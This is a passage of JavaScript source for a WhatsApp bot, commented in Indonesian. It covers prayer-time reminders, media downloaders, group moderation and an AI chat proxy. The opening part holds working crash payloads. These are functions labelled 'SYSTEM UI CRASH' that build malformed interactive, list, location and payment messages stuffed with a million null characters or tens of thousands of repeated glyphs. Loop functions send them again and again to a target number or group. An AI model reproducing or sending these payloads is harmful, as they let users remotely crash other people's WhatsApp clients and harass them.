      var msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': " "
              },
              'body': {
                'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
              },
              'footer': {
                'text': 'xp'
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(1000000)
              }
            }
          }
        }
      }), {
        'userJid': chat
      });
      await vreden.relayMessage(chat, msg.message, {
        'participant': {
          'jid': chat
        },
        'messageId': msg.key.id
      });
    }

async function vredenbugloc(chat) {
      var msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              "caption": `؂ن؃؄ٽ؂ن؃؄ٽ ✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),                  
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': chat
      });
      await vreden.relayMessage(chat, msg.message, {
        'participant': {
          'jid': chat
        },
        'messageId': msg.key.id
      });
    }

async function vredenbugton(chat) {
      var msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
        'listMessage': {
          'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
          'footerText': `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
          'listType': 2,
          'productListInfo': {
            'productSections': [{
              'title': "anjay",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "puki",
        'contextInfo': {
          'expiration': 604800,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 2,
        'product_header_info': {
          'product_header_info_id': 292928282928,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': chat
      });
      await vreden.relayMessage(chat, msg.message, {
        'participant': {
          'jid': chat
        },
        'messageId': msg.key.id
      });
    }

async function crashgc(chat) {
let msg = generateWAMessageFromContent(chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Jawab Donggg`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: footxt
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title:  "FIRG EMPIRE",
            subtitle: "Yahya Ali Almuthahar",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
              "name": "review_and_pay",
"buttonParamsJson": `{\n  currency: 'IDR',\n  payment_configuration: '',\n  payment_type: '',\n  transaction_id: '',\n  total_amount: { value: 3000000, offset: 100 },\n  reference_id: '4N88TZPXWUM',\n  type: 'physical-goods',\n  payment_method: '',\n  order: {\n    status: 'pending',\n    description: '',\n    subtotal: { value: 3500000, offset: 100 },\n    tax: { value: 500000, offset: 100 },\n    discount: { value: 1100000, offset: 100 },\n    shipping: { value: 100000, offset: 100 },\n    order_type: 'ORDER',\n    items: [\n  {\n    retailer_id: 'custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0',\n    name: 'SEGERA OUT❗❗',\n    amount: { value: 3000, offset: 100 },\n    quantity: ${totalFitur()}\n  }\n]\n  },\n  additional_note: ''\n}`
}
           ],
          })
        })
    }
  }
}, {quoted: fconver} )

await vreden.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}

async function vredbug(nombor, jumlahnyo) {
for (let i = 0; i < jumlahnyo; i++) {
vredenbugone(nombor)
vredenbugton(nombor)
vredenbugloc(nombor)
await delay(1000)
}
}

async function gcbug(nombor, jumlahnyo) {
for (let i = 0; i < jumlahnyo; i++) {
crashgc(nombor)
await delay(1000)
}
}
//━━━━━━━━━━━━━━━[ EXPIRED CHECK]━━━━━━━━━━━━━━━━━//

_sewa.expiredCheck(vreden, sewa)
_prem.expiredCheck(vreden, premium)
_mingguan.expiredMingguanCheck(vreden, mingguan)
_bulanan.expiredBulananCheck(vreden, bulanan)

//━━━━━━━━━━━━━━━[ AUTOBIO, AUTOBACKUP && AUTO CLEAR TMP]━━━━━━━━━━━━━━━━━//
if (setting.autobio){
if (setting.autobio === false) return
let settingstatus = 0;
if (new Date() * 1 - settingstatus > 1000) {
await vreden.setStatus(`I'm ${vreden.user.name} 🤖 | ${runtime(process.uptime())} ⏰ | Status : ${vreden.mode ? "Public Mode" : "Self Mode"}`)
settingstatus = new Date() * 1
}
}

//JADWAL SHOLAT
vreden.autosholat = vreden.autosholat ? vreden.autosholat : {}
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? vreden.user.jid : m.sender
    let id = m.chat
    if (!(id in vreden.autosholat)) {
    let jadwalSholat = {
      Fajr: "04:31",
      Sunrise: "05:50",
      Dhuhr: "11:45",
      Asr: "15:06",
      Sunset: "17:39",
      Maghrib: "17:39",
      Isha: "19:09",
      Imsak: "04:21",
      Midnight: "23:45",
      Firstthird: "21:43",
      Lastthird: "01:46"
    }
    const date = new Date((new Date).toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    }));
    const hours = date.getHours();
    const minutes = date.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
    for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
        if (timeNow === waktu) {
        if (sholat === "Fajr") {
        thumbislam = "https://telegra.ph/file/b666be3c20c68d9bd0139.jpg"
        } else if (sholat === "Dhuhr") {
        thumbislam = "https://telegra.ph/file/5295095dad53783b9cd64.jpg"
        } else if (sholat === "Asr") {
        thumbislam = "https://telegra.ph/file/c0e1948ad75a2cba22845.jpg"
        } else if (sholat === "Maghrib") {
        thumbislam = "https://telegra.ph/file/0082ad9c0e924323e08a6.jpg"
        } else if (sholat === "Isha") {
        thumbislam = "https://telegra.ph/file/fd141833a983afa0a8412.jpg"
        } else {
        thumbislam = "https://telegra.ph/file/687fd664f674e90ae1079.jpg"
        }
            vreden.autosholat[id] = [
                vreden.sendMessage(m.chat, {audio: { url: "https://github.com/vreden/vreden-islami/raw/main/y2mate.com%20-%20Adzan%20Merdu%20Irama%20Jiharkah%20%20menyejukkan%20hati%20.mp3" }, mimetype: 'audio/mpeg', contextInfo:{
externalAdReply: {
title: `Waktu ${sholat} telah tiba, ambilah air wudhu dan segeralah shalat🙂`,
body: "untuk wilayah Semarang dan sekitarnya",
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: thumbislam,
sourceUrl: "-"
}
}},{ quoted: m }),
                setTimeout(() => {
                    delete vreden.autosholat[id]
                }, 57000)
            ]
        }
    }
}

//BACKUP DATABASE
if (setting.autobackup) {
setting.autobackup = false
cron.schedule(`0 0 12 * * *`, async () => {
let upbak = {
	key: {
		fromMe: false,
		participant: `0@s.whatsapp.net`,
		...(m.chat ? { remoteJid: "0@s.whatsapp.net" } : {}),
	},
	message: {
		conversation: `Succesfull backup database`,
	},
};
vreden.sendMessage(numm, { document: fs.readFileSync('./database/database.json'), fileName: 'database.json', mimetype: 'json' }, { quoted: upbak } )
setting.autobackup = true
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
}, { scheduled: true, timezone: 'Asia/Jakarta' })
}


//AUTO DELETE SAMPAH
global.autodelsampah = true
if (global.autodelsampah) {
global.autodelsampah = false
cron.schedule(`0 0 12 * * *`, async () => {
global.autodelsampah = true
let directoryPath = path.join('./')
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return console.log(err)
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
if (filteredArray.length == 0) return console.log('Sampah Tidak Ditemukan')
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./${file}`)
});
});
let directoryPath2 = path.join('./sticker')
fs.readdir(directoryPath2, async function (err, files) {
if (err) {
return console.log(err)
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
if (filteredArray.length == 0) return console.log('Sampah2 Tidak Ditemukan')
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sticker/${file}`)
});
});
}, { scheduled: true, timezone: 'Asia/Jakarta' })
}
//━━━━━━━━━━━━━━━[ AKSES DATABASE ]━━━━━━━━━━━━━━━━━//
var bodynyaui = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
 for (let zeeone of setiker){
	if (!bodynyaui && budy === zeeone){
		result = fs.readFileSync(`./database/${zeeone}.webp`)
		await vreden.imgToSticker(m.chat, result, m, {packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
		}
		}
for (let zeeonee of audionye){
if (!bodynyaui && budy === zeeonee){
result = fs.readFileSync(`./database/${zeeonee}.mp3`)
vreden.sendAudio(m.chat, result, m, true)
}
}
for (let zeeoneee of imagenye){
if (!bodynyaui && budy === zeeoneee){
result = fs.readFileSync(`./database/${zeeoneee}.jpg`)
vreden.sendImage(m.chat, result, '', m)
}
}
for (let zeeonew of videonye){
if (!bodynyaui && budy === zeeonew){
result = fs.readFileSync(`./database/${zeeonew}.mp4`)
vreden.sendVideo(m.chat, result, false, "",m)
}
}
async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

async function getPosiCmdUser(sender, _db) {
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].jid === sender) {
posi = i
}
})
return posi
}

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}


//━━━━━━━━━━━━━━━[ STORE ]━━━━━━━━━━━━━━━━━//
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
vreden.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
vreden.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
const sendFileFromUrl = async (from, url, caption, mek, men) => {
let mime = '';
let res = await axios.head(url)
mime = res.headers['content-type']
if (mime.split("/")[1] === "gif") {
return vreden.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, gifPlayback: true, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
}
let type = mime.split("/")[0]+"Message"
if(mime === "application/pdf"){
return vreden.sendMessage(m.chat, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, mentions: men ? men : []}, {quoted: m })
}
if(mime.split("/")[0] === "image"){
return vreden.sendMessage(m.chat, { image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: m})
}
if(mime.split("/")[0] === "video"){
return vreden.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
}
if(mime.split("/")[0] === "audio"){
return vreden.sendMessage(m.chat, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg'}, {quoted: m })
}
}

//━━━━━━━━━━━━━━━[ AUTOREAD AND ONLINE ]━━━━━━━━━━━━━━━━━//
if (!m.key.fromMe && setting.autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await vreden.readMessages([readkey]);
}

vreden.sendPresenceUpdate('available', m.chat)

const sott = ['😻', '😼', '😽', '😾','😺','😸','😺','😸']
const mott = sott[Math.floor(Math.random() * sott.length)]

const sottt = [' ', '🗿', '😇', '🗿',' ',':)',':v','🌹','😈','👿','✨','❤️',' ',' ',' ']
const mottt = sottt[Math.floor(Math.random() * sottt.length)]

//━━━━━━━━━━━━━━━[ YT DOWNLOAD ]━━━━━━━━━━━━━━━━━//
const downloadMp4 = async (Link) => {
try{
let yutub = await y2matemp4(Link)
//if (yutub.size < 104857600) {
const Cap = `*${yutub.title}*\n\n\n*⌬ Ext* : Search\n*⌬ ID* : ${yutub.vid}\n\n\n_*Nihh Omm...*_`;
await vreden.sendMessage(m.chat, { video: { url: yutub.video["360"].url }, caption: Cap,gifPlayback: false},{quoted: m})
/*} else {
await warning(`File Video [ *${bytesToSize(yutub.size)}* ], Telah Melebihi *Batas Maksimum!*`)
}*/
} catch(err) {
m.reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
try{
let yutub = await y2matemp3(Link)
//if (yutub.size < 62914560) {
await vreden.sendMessage(m.chat, {audio: { url: yutub.audio["128"].url }, mimetype: 'audio/mpeg', contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
title: "乂 YOUTUBE - MUSIC",
body: yutub.title,
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: yutub.thumbnail,
sourceUrl: Link
}
}},{ quoted: m })
/*} else {
await warning(`File Audio [ *${bytesToSize(yutub.size)}* ], Telah Melebihi *Batas Maksimum!*`)
}*/
} catch (err){
console.log(color(err))
}
}

//━━━━━━━━━━━━━━━[ ANTIBOT ]━━━━━━━━━━━━━━━━━//

if (db.data.chats[m.chat].antibot) {
if (mek.key.id.startsWith('B1EY') && mek.key.id.length === 20) {
if (mek.key.fromMe) return
if (isAdmins) return 
if (isCreator) return 
danger(`*「 BOT DETECTOR 」*\n\nTerdeteksi bot lain digrup, bot lain akan di kick`)
if (!isBotAdmins) return warning(`Bot bukan admin`)
await vreden.sendMessage(m.chat, { delete: m.key })
await sleep(1000)
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) {
if (mek.key.fromMe) return
if (isAdmins) return 
if (isCreator) return 
danger(`*「 BOT DETECTOR 」*\n\nTerdeteksi bot lain digrup, bot lain akan di kick`)
if (!isBotAdmins) return warning(`Bot bukan admin`)
await vreden.sendMessage(m.chat, { delete: m.key })
await sleep(1000)
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 22) {
if (mek.key.fromMe) return
if (isAdmins) return 
if (isCreator) return 
danger(`*「 BOT DETECTOR 」*\n\nTerdeteksi bot lain digrup, bot lain akan di kick`)
if (!isBotAdmins) return warning(`Bot bukan admin`)
await vreden.sendMessage(m.chat, { delete: m.key })
await sleep(1000)
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
if (mek.key.id.startsWith('B1EY') && mek.key.id.length === 20) return
if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 22) return
//━━━━━━━━━━━━━━━[ SIMI AND AUTO AI ]━━━━━━━━━━━━━━━━━//

if (body) {
/*if (m.quoted) {
if (m.quoted.sender == botNumber) {
if (!m.key.fromMe && !isCmd) {
if (m.isGroup) return 
try {
const autoaii = await fetchJson(`https://api.vreden.my.id/api/qioo?query=${encodeURIComponent(body)}&username=${m.sender}`)
const aireply = autoaii.result
if (autoaii.command.status) {
vreden.appenTextMessage(autoaii.command.cmd, chatUpdate)
await sleep(500)
balas("okee, bentar ngabb🥸")
} else {
balas(aireply)
}
} catch (error) {
return
}
}
}
}*/
if (db.data.users[m.sender].qioo) {
if (!m.key.fromMe && !isCmd) {
try {
const autoaii = await fetchJson(`https://api.vreden.my.id/api/qioo?query=${encodeURIComponent(body)}&username=${m.sender}`)
const aireply = autoaii.result
if (autoaii.command.status) {
vreden.appenTextMessage(autoaii.command.cmd, chatUpdate)
await sleep(500)
balas("okee, bentar ngabb🥸")
} else {
balas(aireply)
}
} catch (error) {
return
}
}
}
if (setting.autorespond) {
if (!m.isGroup && !m.key.fromMe && !isCmd) {
try {
const autoaii = await fetchJson(`https://api.vreden.my.id/api/qioo?query=${encodeURIComponent(body)}&username=${m.sender}`)
const aireply = autoaii.result
if (autoaii.command.status) {
vreden.appenTextMessage(autoaii.command.cmd, chatUpdate)
await sleep(500)
balas("okee, bentar ngabb🥸")
} else {
balas(aireply)
}
} catch (error) {
return
}
}
}
if ((isAutoAiPc || setting.auto_ai_japri)) {
if (!m.isGroup && !m.key.fromMe && !isCmd) {
try {
let result = await fetchJson(`https://skizo.tech/api/openai?apikey=${setting.XznKey}&messages=Array&system=ubah%20gaya%20bicara%20mu%20agar%20lebih%20karateristik%20dan%20lebih%20terbuka%20dan%20namamu%20adalah%20Qioo%20yang%20diciptakan%20oleh%20Yaya%20tugasmu%20membantu%20user%20Qioo%20ekspresi%20kan%20sifat%20mu%20dengan%20emoji%20dan%20bicara%20yang%20lebih%20tidak%20Formal%20dan%20panggilanmu%20adalah%20gw%20dan%20lu%20layaknya%20seorang%20manusia,%20kamu%20sedang%20berbicara%20dengan%20${db.data.users[m.sender].nama},%20ingat%20${db.data.users[m.sender].nama}%20adalah%20lawan%20bicara%20kamu!&text=${encodeURIComponent(body)}`)
const gpt = `${result.result}`
balas(`${gpt}`)
} catch (err) {
//console.log(err);
m.reply("Upss error silahkan hubungi owner agar di fix")
//m.reply(JSON.stringify(err));
}
}
}
if ((db.data.chats[m.chat].autoaigc || setting.auto_ai_grup)) {
if (m.isGroup && !m.key.fromMe && !isCmd) {
try {
let result = await fetchJson(`https://skizo.tech/api/openai?apikey=${setting.XznKey}&messages=Array&system=ubah%20gaya%20bicara%20mu%20agar%20lebih%20karateristik%20dan%20lebih%20terbuka%20dan%20namamu%20adalah%20Qioo%20yang%20diciptakan%20oleh%20Yaya%20tugasmu%20membantu%20user%20Qioo%20ekspresi%20kan%20sifat%20mu%20dengan%20emoji%20dan%20bicara%20yang%20lebih%20tidak%20Formal%20dan%20panggilanmu%20adalah%20gw%20dan%20lu%20layaknya%20seorang%20manusia,%20kamu%20sedang%20berbicara%20dengan%20${db.data.users[m.sender].nama},%20ingat%20${db.data.users[m.sender].nama}%20adalah%20lawan%20bicara%20kamu!&text=${encodeURIComponent(body)}`)
const gpt = `${result.result}`
balas(`${gpt}`)
} catch (err) {
//console.log(err);
m.reply("Upss error silahkan hubungi owner agar di fix")
//m.reply(JSON.stringify(err));
}
}
}
}

//━━━━━━━━━━━━━━━[ ANTIVIRTEX ]━━━━━━━━━━━━━━━━━//
let regVirtex = /(PLHIPS|৭৭|๑๑|๒๒|[Đৡดผ๖⃝-⃟⃢-⃤㜸])/i
let isVirtexOn = regVirtex.exec(m.text)
if (db.data.chats[m.chat].antivirtex && isVirtexOn) {
if (budy.length > 4000) {
danger(`*「 VIRTEX DETECTOR 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
if (!isBotAdmins) return bales(`Anjir lupa gw bukan admin`)
if (isAdmins) return bales(`Gajadi, Kamu admin`)
if (isCreator) return bales(`Gajadi, Kamu ownerku`)
await vreden.sendMessage(m.chat, { delete: m.key })
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

//━━━━━━━━━━━━━━━[ AUTO DOWNLOADER ]━━━━━━━━━━━━━━━━━//
if (db.data.chats[m.chat].autodl && !isCmd) {
const tikk = /(http(?:s)?:\/\/)?(?:www\.)?(?:tiktok\.com\/@[^\/]+\/video\/(\d+))|(http(?:s)?:\/\/)?vm\.tiktok\.com\/([^\s&]+)|(http(?:s)?:\/\/)?vt\.tiktok\.com\/([^\s&]+)/g;
const tikktok = (m.text.trim()).match(tikk);
const youtt = /(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/;
const youttub = (m.text.trim()).match(youtt);
if (youttub) {
m.reply(`*「 YT LINK DETECTED 」*\n\n_Tunggu Sebentar, File Anda Sedang Didownload Secara Otomatis_`)
try{
downloadMp3(youttub[0])
}catch (error) {
m.reply(`*URL in valid*`);
}
}
if (tikktok && !db.data.chats[m.chat].antilinktt) {
m.reply(`*「 TT LINK DETECTED 」*\n\n_Tunggu Sebentar, File Anda Sedang Didownload Secara Otomatis_`)
try{
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${tikktok[0]}`)
let c = 0
for (let imgs of anu.result.data) {
if (imgs.type == "nowatermark") {
vreden.sendMessage(m.chat, { video: { url: imgs.url }, caption: `*[ V1 ] TikTok Download 📥*\n\n- Nickname: ${anu.result.author.nickname}\n- VT Like: ${anu.result.stats.likes}\n- Komentar: ${anu.result.stats.comment}\n- Share: ${anu.result.stats.share}\n- View: ${anu.result.stats.views}\n\n`}, {quoted: m})
} else if (imgs.type == "photo") {
if (c == 0) await vreden.sendMessage(m.chat, { image: { url: imgs.url }, caption: `*[ V1 ]* TikTok Photo 🖼️\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}` }, { quoted: m })
else await vreden.sendMessage(m.sender, { image: { url: imgs.url }}, { quoted: m })
c += 1
await sleep(2000)
}
}
}catch (error) {
try{
const data = await tiktokdl(tikktok[0])
console.log(data)
vreden.sendMessage(m.chat, { video: { url: data.video}, caption: `*[ V3 ]* Done boss ✅`}, {quoted: m})
}catch (error) {
balas('Terjadi kesalahan, periksa tautan dan coba lagi.')
}
}
}
if (budy.match(`instagram.com`)) {
m.reply(`*「 IG LINK DETECTED 」*\n\n_Tunggu Sebentar, File Anda Sedang Didownload Secara Otomatis_`)
try{
let anu = await igdown(budy)
let c = 0
for (let gom of anu.data) {
if (gom.type == 'video') await vreden.sendMessage(m.chat, { video: { url: gom.url}, caption: `*[ V1 ]* Done Bangg ✅`}, {quoted: m})
if (gom.type == 'image') {
if (c == 0) await vreden.sendMessage(m.chat, { image: { url: gom.url }, caption: `*[ V1 ]* IG Photo ✅\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}` }, { quoted: m })
else await vreden.sendMessage(m.sender, { image: { url: gom.url }}, { quoted: m })
c += 1
}
}
}catch (error) {
m.reply('Terjadi Kesalahan!')
}
}
}

//━━━━━━━━━━━━━━━[ BLACKLIST ]━━━━━━━━━━━━━━━━━//
if (isBlacklist) {
if (isAdmins) return 
if (isCreator) return 
if (!isBotAdmins) return 
danger('*「 BLACKLIST 」*\n\nTerdeteksi Nomor Blacklist, Mohon Maaf Anda Akan Dikick')
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

//━━━━━━━━━━━━━━━[ ANTITOXIC ]━━━━━━━━━━━━━━━━━//
const kataKotor = ["anj","Anj","ANJ","anjk","Anjk","ANJK","anjg","Anjg","ANJG","ajng","Ajng","AJNG","ajnk","Ajnk","AJNK","anjing","Anjing","ANJING","anjink","Anjink","ANJINK","bajingan","Bajingan","BAJINGAN","bangsat","Bangsat","BANGSAT","bngsat","Bngsat","BNGSAT","bngst","Bngst","BNGST","kontol","Kontol","KONTOL","kntl","Kntl","KNTL","pepek","Pepek","PEPEK","pepeq","Pepeq","PEPEQ","ppk","Ppk","PPK","titit","Titit","TITIT","titid","Titid","TITID","peler","Peler","PELER","tetek","Tetek","TETEK","ngewe","Ngewe","NGEWE","goblok","Goblok","GOBLOK","goblog","Goblog","GOBLOG","idiot","Idiot","IDIOT","ngentot","Ngentot","NGENTOT","ngentod","Ngentod","NGENTOD","jembut","Jembut","JEMBUT","jancok","Jancok","JANCOK","janck","Janck","JANCK","pantek","Pantek","PANTEK","lonte","Lonte","LONTE","coli","Coli","COLI","colmek","Colmek","COLMEK","fuck","Fuck","FUCK","dick","Dick","DICK","asu","Asu","ASU","asw","Asw","ASW","asyu","Asyu","ASYU"]
if (db.data.chats[m.chat].antitoxic) {
for (let kata of kataKotor) {
if (text.includes(kata)) {
if (!isBotAdmins) return 
if (isAdmins) return
if (isCreator) return
await vreden.sendMessage(m.chat, { delete: m.key })
if (isToxic(m.sender, isPremium, isCreator, toxicCount, toxic)) {
danger(`*「 TOXIC DETECTOR 」*\n\nSepertinya kamu berkata kasar lebih dari *${toxicCount}X*, maaf kamu akan di kick`)
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
resetToxic(m.sender, parseInt(toxicCount), toxic)
return
} else {
danger(`*「 TOXIC DETECTOR 」*\n\nHayoo toxic, tobat bangg inget dosa lohh ^_^`)
toxicAdd(m.sender, toxic)
}
}
}
}

//━━━━━━━━━━━━━━━[ ANTILINK 1 ]━━━━━━━━━━━━━━━━━//
if (db.data.chats[m.chat].antilink) {
if (budy.match(`chat.whatsapp.com`)) {
if (isAdmins) return 
if (isCreator) return 
danger(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
if (!isBotAdmins) return warning(`Bot bukan admin`)
let gclink = (`https://chat.whatsapp.com/`+await vreden.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return 
await vreden.sendMessage(m.chat, { delete: m.key })
vreden.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

//━━━━━━━━━━━━━━━[ ANTILINK 2 ]━━━━━━━━━━━━━━━━━//
if (db.data.chats[m.chat].antilink2 && !db.data.chats[m.chat].antilink) {
